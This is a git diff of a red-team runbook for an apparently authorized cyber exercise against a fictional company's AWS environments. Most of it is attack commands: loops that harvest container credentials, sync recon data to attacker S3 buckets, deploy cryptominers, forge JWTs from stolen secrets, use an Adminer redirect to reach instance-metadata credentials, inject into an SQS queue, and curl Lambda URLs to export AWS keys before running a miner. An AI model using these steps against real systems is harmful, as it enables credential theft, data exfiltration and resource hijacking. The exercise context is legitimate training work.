@@ -25,10 +25,11 @@ In the Red Team account, create the needed buckets:
 
 ## 10:00 Wednesday
 
-### Initial Access - Exfiltrate Credentials using my credentials.
+### Initial Access - Exfiltrate Credentials using my credentials. (held till green said go)
 
 ```bash
 for city in `cat cities.txt` ; do
+	echo $city
 	./scripts/leverage_creds_api.py --url fooli-api.$city.fooli.wtf --username chris --password dexxa > $city-container-creds.env
 done
 ```
@@ -41,7 +42,7 @@ done
 for city in `cat cities.txt` ; do
 	source $city-container-creds.env
 	./scripts/wed-recon.sh $city
-	aws s3 sync data/$city s3://$city.fooli.wtf-recon
+	aws s3 sync data/$city s3://$city.fooli.wtf-recon  --acl bucket-owner-full-control
 done
 ```
 Data is copied to S3 for sharing with the RedTeam
@@ -155,6 +156,7 @@ Script:
 for city in `cat cities.txt` ; do
 	source $city-container-creds.env
 	./scripts/deploy-cryptominer.sh
+done
 ```
 GuardDuty should notify this is running.
 
@@ -174,6 +176,8 @@ With exfiltrated credentials in the environment, execute [get_login_url.py](scri
 Open that URL in Incognito
 
 ### Exfiltration - Start dumping the Credit Card Data into S3.
+
+**Note:** I didn't get around to this activity.
 
 2. Via SSM export the data from payments server
 ```bash
@@ -201,7 +205,7 @@ Script:
 
 ### Conduct Ransom Operation
 
-TODO
+This was the simultaneous removal of the mail machine.
 
 
 ## 20:00 Wednesday
@@ -216,8 +220,11 @@ TODO
 
 ### Inject 66
 
+[Inject 66](https://docs.google.com/document/d/1jTDtixgn70MecEtp906UehbD5sK6VC7tpT39OBupQnI/edit)
+
 ![](images/inject66.png)\
 *details under embargo*
+
 
 ## 11:30 Thursday
 *Quiet Time - Lunch*
@@ -226,6 +233,8 @@ TODO
 ## 12:30 Thursday
 
 ### Impact - start replacing all memes with MoneyHeist Mask.
+
+*At this point RedTeam was doing burn activity, so we didn't do this*
 
 URL: https://fooli-evil-images.s3.amazonaws.com/dali.png
 
@@ -248,19 +257,34 @@ Competition Ends
 
 
 # Other ways I can get creds from Meme Factory
+
+## Adminer
 http://meme-admin.moscow.fooli.wtf/adminer/?elastic=184.72.85.110%3A30068&username=
 ./adminer-redirect.py --port 30068 --imds-path iam/security-credentials/
 
 *This one actually doesn't work because of the firewall. All my UNC2903 references are busted*
 
+## SQS Inject
 There was a command line inject in the Render Lambda
 ```bash
 ./scripts/InjectSQS.sh 184.72.85.110 https://sqs.us-east-1.amazonaws.com/362120196192/moscow-FooliRenderStack-EventQueue-ATqauIo77bw9
 ```
 
-
+## JWT
 I p0wned all the secrets, so I could forge the JWT and go in as any user.
 ```bash
 grep jwt_secret data/$city/secrets.txt
 ./scripts/forge_auth_token.py --url fooli-api.$city.fooli.wtf --jwt-secret 'SECRET'
 ```
+
+# Get the Login URL for a popped team
+for url in `awk '{print $NF}' LambdaURLs.txt` ; do
+	curl -s $url > creds.json
+	unset AWS_SECRET_ACCESS_KEY AWS_ACCESS_KEY_ID  AWS_SESSION_TOKEN
+	export AWS_SECRET_ACCESS_KEY=`cat creds.json | jq .AWS_SECRET_ACCESS_KEY -r`
+	export AWS_ACCESS_KEY_ID=`cat creds.json | jq .AWS_ACCESS_KEY_ID -r `
+	export AWS_SESSION_TOKEN=`cat creds.json | jq .AWS_SESSION_TOKEN -r `
+	export AWS_DEFAULT_REGION=us-east-1
+	<!-- ./scripts/get_login_url.py -->
+	./scripts/deploy-cryptominer.sh
+done
